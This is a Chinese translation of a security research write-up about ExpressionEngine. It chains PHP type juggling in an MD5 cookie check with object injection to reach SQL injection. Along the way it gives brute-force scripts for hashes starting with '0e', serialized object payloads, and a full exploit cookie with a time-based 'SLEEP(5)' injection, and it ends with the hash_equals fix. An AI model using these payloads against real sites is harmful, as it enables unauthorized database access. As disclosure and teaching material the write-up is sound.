@@ -1,0 +1,657 @@
+# 【技术分享】从弱类型利用以及对象注入到SQL注入
+
+阅读量 **189638**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2017-02-10 11:37:00
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章来源：foxglovesecurity.com
+
+原文地址：<https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+翻译：[西风微雨](http://bobao.360.cn/member/contribute?uid=419303956)
+
+预估稿费：200RMB
+
+投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿
+
+最近我在针对某个目标找寻安全漏洞时，发现了其中一个运行Expression
+Engine(一个内容管理平台)的服务器，这个系统引起了我的注意，因为当我尝试使用“admin”的用户名来登录它时，服务器返回了一个包含PHP序列化数据的cookie。
+大家都知道，未经处理直接反序列化用户可控数据可能会导致命令执行等诸多安全问题。这时候我想与其进行黑盒测试，不如试试能不能下载到目标系统的源代码，通过审计源代码弄明白程序针对序列化数据进行了怎样的后续处理。
+有了代码之后，我通过全局匹配查找cookie的处理流程，最后在文件“./system/ee/legacy/libraries/Session.php”发现cookie被用于了会话认证。
+纵观Session.php，我们发现以下函数用于对序列化的cookie数据进行处理：
+
+    
+    
+    1282  protected function _prep_flashdata()
+    1283  {
+    1284    if ($cookie = ee()->input->cookie('flash'))
+    1285    {
+    1286      if (strlen($cookie) > 32)
+    1287      {
+    1288        $signature = substr($cookie, -32);
+    1289        $payload = substr($cookie, 0, -32);
+    1290
+    1291        if (md5($payload.$this->sess_crypt_key) == $signature)
+    1292        {
+    1293          $this->flashdata = unserialize(stripslashes($payload));
+    1294          $this->_age_flashdata();
+    1295
+    1296          return;
+    1297        }
+    1298      }
+    1299    }
+    1300
+    1301    $this->flashdata = array();
+    1302  }
+
+我们看到cookie在函数开始执行了两次检查判断，然后在第1293行上进行反序列化。那么，接下来我们就来看看我们的原始cookie能否通过检查并被成功反序列化:
+
+    
+    
+    a%3A2%3A%7Bs%3A13%3A%22%3Anew%3Ausername%22%3Bs%3A5%3A%22admin%22%3Bs%3A12%3A%22%3Anew%3Amessage%22%3Bs%3A38%3A%22That+is+the+wrong+username+or+password%22%3B%7D3f7d80e10a3d9c0a25c5f56199b067d4
+
+url编码解码:
+
+    
+    
+    a:2:{s:13:":new:username";s:5:"admin";s:12:":new:message";s:38:"That is the wrong username or password";}3f7d80e10a3d9c0a25c5f56199b067d4
+
+如果flash
+cookie存在的话，在1284行中，就将其赋值给$cookie变量，我们继续向下跟进，1286行中会检查cookie是否大于32位，如果大于32位，就将其最后32位取出并赋值给$signature,剩余部分存储在$payload之中：
+
+    
+    
+    $ php -a
+    Interactive mode enabled
+    php > $cookie = 'a:2:{s:13:":new:username";s:5:"admin";s:12:":new:message";s:38:"That is the wrong username or password";}3f7d80e10a3d9c0a25c5f56199b067d4';
+    php > $signature = substr($cookie, -32);
+    php > $payload = substr($cookie, 0, -32);
+    php > print "Signature: $signaturen";
+    Signature: 3f7d80e10a3d9c0a25c5f56199b067d4
+    php > print "Payload: $payloadn";
+    Payload: prod_flash=a:2:{s:13:":new:username";s:5:"admin";s:12:":new:message";s:29:"Invalid username or password.";}
+    php >
+
+第1291行，我们比较了$payload.$this->sesscryptkey的md5
+hash值，并将其与我们在cookie结尾处截取的$signature进行比较。
+同时我们发现$this->sesscryptcookie的值是从文件“./system/user/config/config.php”中取得的，此加密字段是在系统安装时生成的。
+
+    
+    
+    ./system/user/config/config.php:$config['encryption_key'] = '033bc11c2170b83b2ffaaff1323834ac40406b79';
+
+接下来我们就将此字段作为md5加密的盐值，尝试进行加密处理：
+
+    
+    
+    php > $salt = '033bc11c2170b83b2ffaaff1323834ac40406b79'; php > print md5($payload.$salt); 3f7d80e10a3d9c0a25c5f56199b067d4
+
+如上述结果显示，与$signature的值吻合，证实了我们的推理。
+该系统进行md5检查的目的是防止数据被篡改过。然而表面上看起来，这种检查看起来足以防止这种篡改;
+然而，由于PHP是弱类型语言，在执行变量比较时存在一些漏洞。
+
+  
+
+**弱类型之殃**
+
+我们首先通过一些简单的例子来看看什么是弱类型：
+
+    
+    
+    /* php code*/
+    $a = 1;
+    $b = 1;
+    var_dump($a);
+    var_dump($b);
+    if ($a == $b) { print "a and b are the samen"; }
+    else { print "a and b are NOT the samen"; }
+    ?>
+    Output:
+    $ php steps.php
+    int(1)
+    int(1)
+    a and b are the same
+    
+    
+    /* php code*/
+    $a = 1;
+    $b = 0;
+    var_dump($a);
+    var_dump($b);
+    if ($a == $b) { print "a and b are the samen"; }
+    else { print "a and b are NOT the samen"; }
+    ?>
+    Output:
+    $ php steps.php
+    int(1)
+    int(0)
+    a and b are NOT the same
+    
+    
+    /* php code*/
+    $a = "these are the same";
+    $b = "these are the same";
+    var_dump($a);
+    var_dump($b);
+    if ($a == $b) { print "a and b are the samen"; }
+    else { print "a and b are NOT the samen"; }
+    ?>
+    Output:
+    $ php steps.php
+    string(18) "these are the same"
+    string(18) "these are the same"
+    a and b are the same
+    Output:
+    $ php steps.php
+    string(22) "these are NOT the same"
+    string(18) "these are the same"
+    a and b are NOT the same
+
+上述例子都正如我们预想，但是我们来看看用字符串和整型变量比较的时候会发生什么：
+
+    
+    
+    /* php code*/
+    $a = "1";
+    $b = 1;
+    var_dump($a);
+    var_dump($b);
+    if ($a == $b) { print "a and b are the samen"; }
+    else { print "a and b are NOT the samen"; }
+    ?>
+    Output:
+    php steps.php
+    string(1) "1"
+    int(1)
+    a and b are the same
+
+看起来PHP帮助我们进行了类型强制转换。接下来，让我们看看当我们比较两个看起来像用科学记数法写成的整数字符串时会发生什么：
+
+    
+    
+    /* php code*/
+    $a = "0e111111111111111111111111111111";
+    $b = "0e222222222222222222222222222222";
+    var_dump($a);
+    var_dump($b);
+    if ($a == $b) { print "a and b are the samen"; }
+    else { print "a and b are NOT the samen"; }
+    ?>
+    Output:
+    $ php steps.php
+    string(32) "0e111111111111111111111111111111"
+    string(32) "0e222222222222222222222222222222"
+    a and b are the same
+
+从上面可以看出，即使“$a”和“$b”都是字符串，并且明显是不同的值，使用宽松比较运算符也会导致结果为true，因为当PHP转换字符串到整型时，“0ex”总是变为0。这就是大家所说的弱类型。
+
+  
+
+**"花式利用"宽松比较**
+
+结合弱类型的知识，我们再来看看hash值校验能否一如大家期待的那样继续防止数据篡改： if
+(md5($payload.$this->sess_crypt_key) == $signature)
+
+$payload的值和$signature的值可控，所以如果我们能够找到一个payload，当md5（$this->sesscryptkey)生成的hash值以0e开头并全部以数字结束，然后我们可以通过将$signature的hash设置为以0e开头并全部以数字结尾的值来绕过函数检查。
+
+我通过搜寻网上的一些代码片段写成了一个的POC，用来不断生成md5（$payload.$
+this->sesscryptkey），直到找到我需要的hash值。
+
+首先看看未篡改的payload:
+
+    
+    
+    $ php -a
+    Interactive mode enabled
+    php > $cookie = 'a:2:{s:13:":new:username";s:5:"admin";s:12:":new:message";s:38:"That is the wrong username or password";}3f7d80e10a3d9c0a25c5f56199b067d4';
+    php > $signature = substr($cookie, -32);
+    php > $payload = substr($cookie, 0, -32);
+    php > print_r(unserialize($payload));
+    Array
+    (
+    [:new:username] => admin
+    [:new:message] => That is the wrong username or password
+    )
+    php >
+
+我需要将数组中的‘That is the wrong username or password’修改为’taquito’
+
+我们选定第一个字段[:new:username]进行暴力枚举
+
+    
+    
+    /* php code*/
+    set_time_limit(0);
+    define('HASH_ALGO', 'md5');
+    define('PASSWORD_MAX_LENGTH', 8);
+    $charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $str_length = strlen($charset);
+    function check($garbage)
+    {
+        $length = strlen($garbage);
+        $salt = "033bc11c2170b83b2ffaaff1323834ac40406b79";
+        $payload = 'a:2:{s:13:":new:username";s:'.$length.':"'.$garbage.'";s:12:":new:message";s:7:"taquito";}';
+        #echo "Testing: " . $payload . "n";
+            $hash = md5($payload.$salt);
+            $pre = "0e";
+        if (substr($hash, 0, 2) === $pre) {
+            if (is_numeric($hash)) {
+              echo "$payload - $hashn";
+            }
+          }
+    }
+    function recurse($width, $position, $base_string)
+    {
+            global $charset, $str_length;
+            for ($i = 0; $i < $str_length; ++$i) {
+                    if ($position  < $width - 1) {
+                            recurse($width, $position + 1, $base_string . $charset[$i]);
+                    }
+                    check($base_string . $charset[$i]);
+            }
+    }
+    for ($i = 1; $i < PASSWORD_MAX_LENGTH + 1; ++$i) {
+            echo "Checking passwords with length: $in";
+            recurse($i, 0, '');
+    }
+    ?>
+
+生成我们需要的hash值：
+
+    
+    
+    $ php poc1.php
+    Checking passwords with length: 1
+    Checking passwords with length: 2
+    Checking passwords with length: 3
+    Checking passwords with length: 4
+    Checking passwords with length: 5
+    a:2:{s:13:":new:username";s:5:"dLc5d";s:12:":new:message";s:7:"taquito";} - 0e553592359278167729317779925758
+
+我们将这个值与任意以0e开头并全部以数字结尾的$signature变量进行对比：
+
+    
+    
+    /* php code*/
+    $a = "0e553592359278167729317779925758";
+    $b = "0e222222222222222222222222222222";
+    var_dump($a);
+    var_dump($b);
+    if ($a == $b) { print "a and b are the samen"; }
+    else { print "a and b are NOT the samen"; }
+    ?>
+    Output:
+    $ php steps.php
+    string(32) "0e553592359278167729317779925758"
+    string(32) "0e222222222222222222222222222222"
+    a and b are the same
+
+这样，我们便能成功的控制服务器的返回数据！
+
+  
+
+**弱类型+php对象注入=数据库注入？**
+
+既然能够控制服务器返回数据了，我们来看看将我们自己的任意数据传递到unserialize（）还能做到什么事情。
+为了节省自己一些时间，让我们在“./system/ee/legacy/libraries/Session.php”文件中修改一下代码:
+
+    
+    
+    if (md5($payload.$this->sess_crypt_key) == $signature)
+
+替换为：
+
+    
+    
+    if (1)
+
+这样，我们就无需去满足函数的限制条件了！
+
+既然我们可以控制序列化数组里面的:new:username =>
+admin的值，我们再看到“./system/ee/legacy/libraries/Session.php”的内容，并注意以下函数：
+
+    
+    
+    335 function check_password_lockout($username = '')
+    336 {
+    337   if (ee()->config->item('password_lockout') == 'n' OR
+    338     ee()->config->item('password_lockout_interval') == '')
+    339   {
+    340     return FALSE;
+    341   }
+    342
+    343   $interval = ee()->config->item('password_lockout_interval') * 60;
+    344
+    345   $lockout = ee()->db->select("COUNT(*) as count")
+    346     ->where('login_date > ', time() - $interval)
+    347     ->where('ip_address', ee()->input->ip_address())
+    348     ->where('username', $username)
+    349     ->get('password_lockout');
+    350
+    351   return ($lockout->row('count') >= 4) ? TRUE : FALSE;
+    352 }
+
+这个函数似乎是通过数据库检查用户的存在性和合法性。 $username的值可控，我们应该能够在这里注入我们自己的SQL参数，进而导致SQL注入。
+Expression Engine使用数据库驱动类来与数据库交互，但原始数据库语句就像下面这样（我们可以猜得八九不离十）：
+
+    
+    
+    SELECT COUNT(*) as count FROM (`exp_password_lockout`) WHERE `login_date` > '$interval' AND `ip_address` = '$ip_address' AND `username` = '$username';
+
+我们将$payload数据修改为：
+
+    
+    
+     a:2:{s:13:":new:username";s:1:"'";s:12:":new:message";s:7:"taquito";}
+
+并发出请求，希望能够出现“Syntax error or access violation: 1064 You have an error in your
+SQL syntax; check the manual that corresponds to your MySQL server version for
+the right syntax to use near ”’ at line“的错误，但是什么也没有发生…
+
+  
+
+**绕过数据库类型检查**
+
+经过一番搜索后，我们在“./system/ee/legacy/database/DB_driver.php”中遇到了以下代码：
+
+    
+    
+    525 function escape($str)
+    526 {
+    527   if (is_string($str))
+    528   {
+    529     $str = "'".$this->escape_str($str)."'";
+    530   }
+    531   elseif (is_bool($str))
+    532   {
+    533     $str = ($str === FALSE) ? 0 : 1;
+    534   }
+    535   elseif (is_null($str))
+    536   {
+    537     $str = 'NULL';
+    538   }
+    539
+    540   return $str;
+    541 }
+
+在第527行，我们看到对我们的值执行“is_string（）”检查，如果它是真的，我们的值被转义。
+我们可以通过在函数的开头和结尾放置一个“var_dump”检查变量：
+
+    
+    
+    string(1) "y"
+    int(1)
+    int(1)
+    int(1)
+    int(0)
+    int(1)
+    int(3)
+    int(0)
+    int(1)
+    int(1486399967)
+    string(11) "192.168.1.5"
+    string(1) "'"
+    int(1)
+    string(3) "'y'"
+    int(1)
+    int(1)
+    int(1)
+    int(0)
+    int(1)
+    int(3)
+    int(0)
+    int(1)
+    int(1486400275)
+    string(13) "'192.168.1.5'"
+    string(4) "'''"
+    int(1)
+
+果然，我们可以看到我们的“'”的值已经被转义，现在是“’”。不过我还有个锦囊妙计。
+
+转义检查只是判断“$str”是一个字符串，一个布尔值或是null; 如果它不匹配任何这些类型，“$str”将不会进行转义。
+这意味着如果我们提供一个“对象”，那么我们应该能够绕过函数检查。 但是，这也意味着我们需要找到一个我们可以使用的php对象。
+
+  
+
+**自动加载器'驰援'**
+
+通常，当我们想要寻找可以利用unserialize的类时，我们将搜寻魔术方法（如“__wakeup”或“__destruct”），但是有时候应用程序实际上使用自动加载器。
+自动加载背后的一般想法是，当一个对象被创建时，PHP会检查它是否知道该类的任何内容，如果没有，它会自动加载它。
+对我们来说，这意味着我们不必依赖包含“__wakeup”或“__destruct”方法的类。
+我们只需要找到一个我们可控的“__toString”的类，因为程序把$username作为字符串处理。
+
+我们找到以下文件“./system/ee/EllisLab/ExpressionEngine/Library/Parser/Conditional/Token/Variable.php”：
+
+    
+    
+     1 /* php code*/
+     2
+     3  namespace EllisLabExpressionEngineLibraryParserConditionalToken;
+     4
+     5  class Variable extends Token {
+     6
+     7    protected $has_value = FALSE;
+     8
+     9    public function __construct($lexeme)
+    10    {
+    11      parent::__construct('VARIABLE', $lexeme);
+    12    }
+    13
+    14    public function canEvaluate()
+    15    {
+    16      return $this->has_value;
+    17    }
+    18
+    19    public function setValue($value)
+    20    {
+    21      if (is_string($value))
+    22      {
+    23        $value = str_replace(
+    24          array('{', '}'),
+    25          array('{', '}'),
+    26          $value
+    27        );
+    28      }
+    29
+    30      $this->value = $value;
+    31      $this->has_value = TRUE;
+    32    }
+    33
+    34    public function value()
+    35    {
+    36      // in this case the parent assumption is wrong
+    37      // our value is definitely *not* the template string
+    38      if ( ! $this->has_value)
+    39      {
+    40        return NULL;
+    41      }
+    42
+    43      return $this->value;
+    44    }
+    45
+    46    public function __toString()
+    47    {
+    48      if ($this->has_value)
+    49      {
+    50        return var_export($this->value, TRUE);
+    51      }
+    52
+    53      return $this->lexeme;
+    54    }
+    55  }
+    56
+    57  // EOF
+
+这个类看起来非常适合！
+我们可以看到对象使用参数“$lexeme”调用“construct”，然后调用“toString”，将参数“$lexeme”作为字符串返回，完美！。让我们写一个POC为我们创建序列化对象：
+
+    
+    
+    /* php code*/
+    namespace EllisLabExpressionEngineLibraryParserConditionalToken;
+    class Variable {
+            public $lexeme = FALSE;
+    }
+    $x = new Variable();
+    $x->lexeme = "'";
+    echo serialize($x)."n";
+    ?>
+    Output:
+    $ php poc.php
+    O:67:"EllisLabExpressionEngineLibraryParserConditionalTokenVariable":1:{s:6:"lexeme";s:1:"'";}
+
+经过几个小时的测试，当我们将我们的对象添加到我们的数组中时（注意其中的反斜线）：
+a:1:{s:13:":new:username";O:67:"EllisLab\\\ExpressionEngine\\\Library\\\Parser\\\Conditional\\\Token\\\Variable":1:{s:6:"lexeme";s:1:"'";}}
+当我们使用上面的payload发出请求后，我们插入到代码中用于调试的“var_dump()”函数显示：
+
+    
+    
+    string(3) "'y'"
+    int(1)
+    int(1)
+    int(1)
+    int(0)
+    int(1)
+    int(3)
+    int(0)
+    int(1)
+    int(1486407246)
+    string(13) "'192.168.1.5'"
+    object(EllisLabExpressionEngineLibraryParserConditionalTokenVariable)#177 (6) {
+      ["has_value":protected]=>
+      bool(false)
+      ["type"]=>
+      NULL
+      ["lexeme"]=>
+      string(1) "'"
+      ["context"]=>
+      NULL
+      ["lineno"]=>
+      NULL
+      ["value":protected]=>
+      NULL
+    }
+
+我们生成了一个“对象”而不是一个“字符串”，“lexeme”的值是没有转义的“‘”！接下来我们发现：
+
+    
+    
+    Exception Caught
+    SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 5:
+    SELECT COUNT(*) as count
+    FROM (`exp_password_lockout`)
+    WHERE `login_date` >  1486407246
+    AND `ip_address` =  '192.168.1.5'
+    AND `username` =  '
+    mysqli_connection.php:122
+
+我们成功的通过php对象注入完成了sql注入！
+
+  
+
+**完整POC**
+
+最后，我们来创建了一个poc来使得数据库sleep 5秒。
+
+    
+    
+    /* php code*/
+    set_time_limit(0);
+    define('HASH_ALGO', 'md5');
+    define('garbage_MAX_LENGTH', 8);
+    $charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $str_length = strlen($charset);
+    function check($garbage)
+    {
+        $length = strlen($garbage) + 26;
+        $salt = "033bc11c2170b83b2ffaaff1323834ac40406b79";
+        $payload = 'a:1:{s:+13:":new:username";O:67:"EllisLab\ExpressionEngine\Library\Parser\Conditional\Token\Variable":1:{s:+6:"lexeme";s:+'.$length.':"1 UNION SELECT SLEEP(5) # '.$garbage.'";}}';
+        #echo "Testing: " . $payload . "n";
+            $hash = md5($payload.$salt);
+            $pre = "0e";
+        if (substr($hash, 0, 2) === $pre) {
+            if (is_numeric($hash)) {
+              echo "$payload - $hashn";
+            }
+          }
+    }
+    function recurse($width, $position, $base_string)
+    {
+            global $charset, $str_length;
+            for ($i = 0; $i < $str_length; ++$i) {
+                    if ($position  < $width - 1) {
+                            recurse($width, $position + 1, $base_string . $charset[$i]);
+                    }
+                    check($base_string . $charset[$i]);
+            }
+    }
+    for ($i = 1; $i < garbage_MAX_LENGTH + 1; ++$i) {
+            echo "Checking garbages with length: $in";
+            recurse($i, 0, '');
+    }
+    ?>
+    Output:
+    $ php poc2.php
+    a:1:{s:+13:":new:username";O:67:"EllisLab\ExpressionEngine\Library\Parser\Conditional\Token\Variable":1:{s:+6:"lexeme";s:+31:"1 UNION SELECT SLEEP(5) # v40vP";}} - 0e223968250284091802226333601821
+
+然后发出请求（请再次注意反斜杠）：
+
+    
+    
+    Cookie: exp_flash=a%3a1%3a{s%3a%2b13%3a"%3anew%3ausername"%3bO%3a67%3a"EllisLab\\ExpressionEngine\\Library\\Parser\\Conditional\\Token\\Variable"%3a1%3a{s%3a%2b6%3a"lexeme"%3bs%3a%2b31%3a"1+UNION+SELECT+SLEEP(5)+%23+v40vP"%3b}}0e223968250284091802226333601821
+
+等待5秒，我们便能收到服务器响应！
+
+  
+
+**漏洞修复**
+
+将以下代码：
+
+    
+    
+    if (md5($payload.$this->sess_crypt_key) == $signature)
+
+替换为：
+
+    
+    
+    if (hash_equals(md5($payload.$this->sess_crypt_key),$signature))
+
+本文翻译自foxglovesecurity.com [原文链接](https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Wester** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/85455](/post/id/85455)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [foxglovesecurity.com](https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/)
+
+如若转载,请注明出处： <https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [安全知识](/tag/安全知识)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p2.ssl.qhmsg.com/dm/200_200_100/t01cc1fef36795c3ff3.jpg) Wester
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
